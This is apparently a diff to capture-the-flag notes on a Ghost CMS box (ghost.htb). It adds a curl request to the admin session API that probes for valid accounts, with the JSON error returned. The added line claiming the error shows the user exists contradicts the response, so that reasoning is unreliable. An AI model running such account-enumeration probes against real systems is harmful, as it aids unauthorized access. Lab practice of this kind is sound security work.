@@ -221,5 +221,29 @@ Found a CVE
 https://talosintelligence.com/vulnerability_reports/TALOS-2022-1625
 
 ```python
+curl -X POST http://ghost.htb:8008/ghost/api/admin/session -H 'Content-Type: application/json' --data '{"username":"lkjasdfklasjdf@asdf.com","password":"asdfasdfasdf"}' | jq .
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100    291 100    227 100     64   2705    762                              0
+{
+  "errors": [
+    {
+      "message": "There is no user with that email address.",
+      "context": null,
+      "type": "NotFoundError",
+      "details": null,
+      "property": null,
+      "help": null,
+      "code": null,
+      "id": "8523fb70-a0a2-11f1-a02f-09a7d9773575",
+      "ghostErrorCode": null
+    }
+  ]
+}
+```
+
+Ill use the example POC in the article and see the error, this indicates this user exists
+
+```python
 
 ```
